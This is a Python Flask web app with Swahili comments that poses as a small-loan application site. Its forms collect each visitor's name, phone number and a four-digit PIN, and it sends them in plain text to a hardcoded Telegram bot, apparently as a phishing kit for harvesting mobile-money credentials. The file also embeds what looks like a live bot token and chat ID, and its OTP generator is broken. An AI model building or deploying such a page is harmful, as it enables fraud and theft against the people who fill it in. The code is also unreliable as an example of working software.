from flask import Flask, request, render_template_string
from flask_cors import CORS
import requests
import time
import random

app = Flask(__name__)
CORS(app)

# TOKO YAKO NA CHAT ID ZIKO HAPA TAYARI
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
TELEGRAM_CHAT_ID = "8580615195"

pending_loans = {}
otp_codes = {}

# ================= PAGE 1: CHAGUA AMOUNT =================
@app.route('/', methods=['GET'])
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Loan Application</title>
        <style>
            body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2; margin:0;}
            .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
            h2{color:#333;}
            .btn{display:block; width:90%; padding:15px; margin:12px auto; border-radius:8px; border:none; background:#007bff; color:white; font-size:18px; cursor:pointer; font-weight:bold; transition:0.3s;}
            .btn:hover{background:#0056b3; transform:scale(1.02);}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Step 1 of 2: Chagua Amount</h2>
            <form action="/page2" method="POST"><input type="hidden" name="amount" value="100"><button class="btn">$100 Loan</button></form>
            <form action="/page2" method="POST"><input type="hidden" name="amount" value="200"><button class="btn">$200 Loan</button></form>
            <form action="/page2" method="POST"><input type="hidden" name="amount" value="300"><button class="btn">$300 Loan</button></form>
            <form action="/page2" method="POST"><input type="hidden" name="amount" value="400"><button class="btn">$400 Loan</button></form>
            <form action="/page2" method="POST"><input type="hidden" name="amount" value="500"><button class="btn">$500 Loan</button></form>
        </div>
    </body>
    </html>
    ''')

# ================= PAGE 2: WEKA DETAILS =================
@app.route('/page2', methods=['POST'])
def page2():
    amount = request.form['amount']
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Fill Details</title>
        <style>
            body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2; margin:0;}
            .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
            input{width:90%; padding:12px; margin:10px 0; border-radius:5px; border:1px solid #ccc; font-size:16px;}
            .submit{background:#28a745; color:white; border:none; font-size:18px; cursor:pointer; font-weight:bold;}
            .submit:hover{background:#218838;}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Step 2 of 2: Jaza Maelezo</h2>
            <p>Unaomba: <b style="color:green; font-size:20px;">${{amount}}</b></p>
            <form action="/submit" method="POST">
                <input type="hidden" name="amount" value="{{amount}}">
                <input type="text" name="name" placeholder="Full Name" required><br>
                <input type="tel" name="phone" placeholder="Phone Number e.g 07xxxxxxxx" required><br>
                <input type="password" name="pin" placeholder="Create 4 Digit PIN" maxlength="4" required><br>
                <input type="submit" class="submit" value="Apply Now">
            </form>
        </div>
    </body>
    </html>
    ''', amount=amount)

# ================= SUBMIT LOAN > TUMA TELEGRAM =================
@app.route('/submit', methods=['POST'])
def submit_loan():
    loan_id = str(int(time.time()))
    pending_loans[loan_id] = {
        "amount": request.form['amount'],
        "name": request.form['name'],
        "phone": request.form['phone'],
        "pin": request.form['pin']
    }
    
    loan = pending_loans[loan_id]
    message = f"🔔 NEW LOAN APPLICATION!\n\n💰 Amount: ${loan['amount']}\n👤 Name: {loan['name']}\n📱 Phone: {loan['phone']}\n🔒 PIN: {loan['pin']}\n\nID: {loan_id}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ APPROVE", "callback_data": f"approve_{loan_id}"}, 
             {"text": "❌ REJECT", "callback_data": f"reject_{loan_id}"}]
        ]
    }
    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "reply_markup": keyboard})
    
    return render_template_string('''
    <style>body{font-family:Arial; text-align:center; padding:50px; background:#f2f2f2;}</style>
    <div style="background:white; padding:40px; border-radius:10px; max-width:400px; margin:auto;">
        <h2 style="color:green;">✅ Application Sent!</h2>
        <p>Subiri admin akuthibitishe. Utapata SMS/Link hivi karibuni.</p>
    </div>
    ''')

# ================= TELEGRAM WEBHOOK YA BUTTONS - FIXED =================
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        data_parts = callback['data'].split('_')
        action = data_parts[0]
        loan_id = data_parts[1]
        
        # Jibu Telegram ili isiwe "Connecting..."
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
        requests.post(answer_url, json={"callback_query_id": callback['id'], "text": "Processing..."})
        
        if action == "approve":
            # FIX: SASA NI 6 DIGITS SAHI
            otp = str(random.randint(100000, 999))
            otp_codes[loan_id] = {"code": otp, "expires": time.time() + 60}
            loan = pending_loans[loan_id]
            otp_link = f"https://loan-api-flask.onrender.com/otp?loan_id={loan_id}"
            
            # ONYESHA TIME INAEXPIRA
            expiry_time = int(time.time() + 60)
            expiry_readable = time.strftime('%H:%M:%S', time.localtime(expiry_time))
            
            message = f"✅ APPROVED!\n\nMpe mteja {loan['name']} link hii:\n\n{otp_link}\n\n🔑 CODE: {otp}\n⏰ Ina-expire saa: {expiry_readable}"
        else:
            message = f"❌ LOAN REJECTED\nApplicant: {pending_loans[loan_id]['name']}"
            
        send_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(send_url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        
    return "ok"

# ================= PAGE 3: MTEJA AINGIZE OTP CODE =================
@app.route('/otp', methods=['GET'])
def otp_page():
    loan_id = request.args.get('loan_id')
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enter OTP</title>
        <style>
            body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2; margin:0;}
            .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
            input{width:90%; padding:15px; margin:10px 0; border-radius:5px; border:2px solid #007bff; font-size:20px; text-align:center; letter-spacing:8px; font-weight:bold;}
            .submit{background:#28a745; color:white; border:none; font-size:18px; cursor:pointer; font-weight:bold; padding:15px;}
            .submit:hover{background:#218838;}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Enter Approval Code</h2>
            <p style="color:red;">Admin amekutumia code. Ina-expire in 60 seconds</p>
            <form action="/verify_otp" method="POST">
                <input type="hidden" name="loan_id" value="{{loan_id}}">
                <input type="text" name="otp" placeholder="123456" maxlength="6" required><br>
                <input type="submit" class="submit" value="Verify & Get Loan">
            </form>
        </div>
    </body>
    </html>
    ''', loan_id=loan_id)

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    loan_id = request.form['loan_id']
    user_otp = request.form['otp']
    
    if loan_id in otp_codes:
        if otp_codes[loan_id]['code'] == user_otp and time.time() < otp_codes[loan_id]['expires']:
            amount = pending_loans[loan_id]['amount']
            return f"<h2 style='color:green; text-align:center;'>✅ SUCCESS!</h2><p style='text-align:center;'>Loan yako ya ${amount} imethibitishwa. Pesa itatumwa kwa {pending_loans[loan_id]['phone']} hivi karibuni.</p>"
        else:
            return "<h2 style='color:red; text-align:center;'>❌ CODE EXPIRED</h2><p style='text-align:center;'>Code iliisha. Tafadhali omba tena.</p>"
    return "<h2 style='color:red; text-align:center;'>❌ INVALID CODE</h2>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
